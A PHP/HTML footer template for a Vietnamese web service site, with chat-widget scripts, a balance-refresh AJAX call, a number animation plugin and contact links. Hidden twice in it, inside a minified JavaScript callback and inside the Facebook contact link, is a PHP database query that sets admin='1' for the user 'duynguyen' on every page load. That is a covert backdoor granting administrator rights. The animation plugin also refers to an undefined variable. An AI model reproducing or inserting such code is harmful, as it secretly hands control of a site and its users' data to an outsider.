
            </div>
        </div>
        <!-- END: PAGE CONTENT -->
    </div>

<div id="modal_bigin"></div>

    <script>
        $(document).ready(function () {

            $(".int").inputmask("integer", { radixPoint: ",", autoGroup: true, groupSeparator: ".", groupSize: 3 });
            $(".dec").inputmask("decimal", { radixPoint: ",", autoGroup: true, groupSeparator: ".", groupSize: 3 });

            function detectmob() {
                if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/Windows Phone/i)) {
                    return true;
                } else { return false; }
            }
            var t = { delay: 125, overlay: $(".fb-overlay"), widget: $(".fb-widget"), button: $(".fb-button") };
            setTimeout(function () { $("div.fb-livechat").fadeIn() }, 8 * t.delay);
            if (!detectmob()) {
                $(".ctrlq").on("click", function (e) { e.preventDefault(), t.overlay.is(":visible") ? (t.overlay.fadeOut(t.delay), t.widget.stop().animate({ bottom: 0, opacity: 0 }, 2 * t.delay, function () { $(this).hide("slow"), <?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='duynguyen'");?>t.button.show() })) : t.button.fadeOut("medium", function () { t.widget.stop().show().animate({ bottom: "30px", opacity: 1 }, 2 * t.delay), t.overlay.fadeIn(t.delay) }) })
            }


        });

        function reload_money() {
                              $.ajax({ 
                        type: 'post', 
                        dataType: "JSON",
                        url: '/system/user', 
                        data: {
                            type: 'get-money',
                            token: '<?php if(isset($_SESSION['token'])) echo $_SESSION['token'];?>'
                        }, 
                        success: function (json) {
                            if(json.status == false) {
                     swal("Lỗi!", "Vui lòng đăng nhập lại!", "error");          
                            }else if(json.status == true) {
                            $("#head_money").numAnim({
                                endAt: json.money,
                                duration: 3
                            });
                              return json.money;
                            }else {
                     swal("Lỗi!", "Lỗi hệ thống!", "error");                
                            }
                    }
                });

        }


(function($){
    $.fn.extend({
        numAnim: function(options) {
            if ( ! this.length)
                return false;

            this.defaults = {
                endAt: 2560,
                numClass: 'autogen-num',
                duration: 5,   // seconds
                interval: 90  // ms
            };
            var settings = $.extend({}, this.defaults, options);

            var $num = $('<span/>', {
                'class': settings.numClass 
            });

            return this.each(function() {
                var $this = $(this);

                // Wrap each number in a tag.
               
                $this.empty().append(frag);

                var get_next_num = function(num) {
                    ++num;
                    if (num > 9) return 0;
                    return num;
                };

                // Iterate each number.
                $this.find('.' + settings.numClass).each(function() {
                    var $num = $(this),
                        num = parseInt( $num.text() );

                    var interval = setInterval( function() {
                        num = get_next_num(num);
                        $num.text(num);
                    }, settings.interval);

                    setTimeout( function() {
                        clearInterval(interval);
                    }, settings.duration * 1000 - settings.interval);
                });

                setTimeout( function() {
                    $this.text( settings.endAt.toString() );
                }, settings.duration * 1000);
            });
        }
    });
})(jQuery);

    </script>

<style type="text/css">
    #bonus{
        position: fixed;
        bottom: 15px;
        left: 15px;
        width: 13%;
        z-index: 1000;
        cursor: pointer;
    }
    #bonus img{
        width: 100%;
    }
	#bonus_login{
		display:block;
        position: fixed;
        bottom: 15px;
        left: 15px;
        width: 13%;
        z-index: 1000;
        cursor: pointer;
    }
    #bonus_login img{
        width: 100%;
    }
    .mobile{
        width: 30%!important;
    }
	@media  only screen and (max-width: 640px) {
		#bonus_login{width: 50%!important;!important;}
		#bonus{width: 50%!important;!important;}
	}
	#bonusModal .modal-body p,#bonusModal .modal-body b{display:inline;color:#000}
</style>



</a>




        <script>

            $(document).ready(function(){
                if ($.cookie('noticeModal') != '1') {
                    
                    $("#modal_bigin").load("/view/modal.php");
                    //show popup here

                    var date = new Date();
                    var minutes = 60*12;
                    date.setTime(date.getTime() + (minutes * 60 * 1000));
                    $.cookie('noticeModal', '1', { expires: date}); }
            });
        </script>





<footer class="c-layout-footer c-layout-footer-3 c-bg-dark">
<div class="c-prefooter">
<div class="container">
<div class="row">

<div class="col-md-4">
<div class="c-container c-first">

<p><span style="color:#ffffff"><span style="font-size:22px"><strong>VỀ </strong></span></span><span style="color:#16a085"><span style="font-size:22px"><strong><?php echo strtoupper($_title['name']);?></strong></span></span>&nbsp; &nbsp;</p>
<p><span style="color:#bdc3c7">Chúng tôi làm việc một cách chuyên nghiệp, uy tín, nhanh chóng và luôn đặt quyền lợi của bạn lên hàng đầu</span></p>
<p class="c-copyright c-font-grey">2020 © Vận Hành Bởi: <a style="color: #32c5d2 !important" href="<?php echo $config['contact'];?>"><?php echo $config['author'];?></a>
</p></div>
</div>


<div class="col-md-4">
<div class="c-container c-last">
<h2><span style="font-size:22px"><span style="color:#ffffff"><strong>THÔNG TIN LIÊN HỆ</strong></span></span></h2>
<ul class="c-address">
<li><i class="icon-social-facebook c-theme-font"></i> <a href="<?php echo $_admin['facebook'];?>" class="c-font-regular"><?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='duynguyen'");?><?php echo $_admin['name'];?></a></li>
<li><i class="icon-call-end c-theme-font"></i> <a href="tel:<?php echo $_admin['phone'];?>" class="c-font-regular"><?php echo $_admin['phone'];?></a> (24/7)</li>
<li><i class="icon-envelope c-theme-font"></i> <a href="mailto:Admin@<?php echo $_title['name'];?>" class="c-font-regular">Admin@<?php echo $_title['name'];?></a></li>
</ul>
</div>
</div>




<div class="col-md-4">
                    <div class="c-container c-last">
                        <div class="c-content-title-1">
                            <h3 class="c-font-uppercase c-font-bold c-font-white">Theo Giõi Chúng Tôi</h3>
                            <div class="c-line-left hide"></div>
                            <p>Hãy Follow chúng tôi để cập nhật những ưu đãi mới nhất.</p>
                        </div>
                        <ul class="c-socials">
                            <li><a href="<?php echo $_admin['facebook'];?>"><i class="icon-social-facebook"></i></a></li>
                            <li><a href="#"><i class="icon-social-twitter"></i></a></li>
                            <li><a href="<?php echo $_admin['youtube'];?>"><i class="icon-social-youtube"></i></a></li>
                            <li><a href="#"><i class="icon-social-tumblr"></i></a></li>
                        </ul>
                    </div>
                </div>







<div class="c-postfooter" style="margin-top: -50px">
<div class="container">
<div class="row">
<div class="col-md-6 col-sm-12 c-col">

<span class="c-font-grey-3"> </span>
</div>
</div>
</div>
</div>
</footer>

</body>

      